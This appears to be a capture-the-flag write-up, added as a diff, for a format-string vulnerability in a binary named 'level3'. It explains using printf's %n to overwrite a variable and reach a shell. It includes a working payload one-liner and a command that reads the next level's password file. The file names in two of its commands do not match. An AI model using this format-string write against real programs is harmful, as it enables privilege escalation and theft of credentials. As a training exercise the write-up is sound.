@@ -1,0 +1,12 @@
+We can see in the binary that there is a /bin/sh call in a if instruction that compare a variable with 64.
+What we need to do is to modify this value so that will match with 64.
+There is a printf after the fgets command that print all input of the user.
+We know that printf store values in the stack. If we send %x to the program we receive stack address.
+objdump -t level3 to find the address of the "m" variable that is compare.
+We use the %n printf option to write 64 characters into the address of "m".
+
+$> python -c 'print "\x8c\x98\x04\x08%60x%4$hn"' > /tmp/exploit3
+
+$> cat /tmp/exploit - | ./level3
+
+$> cat ../level4/.pass
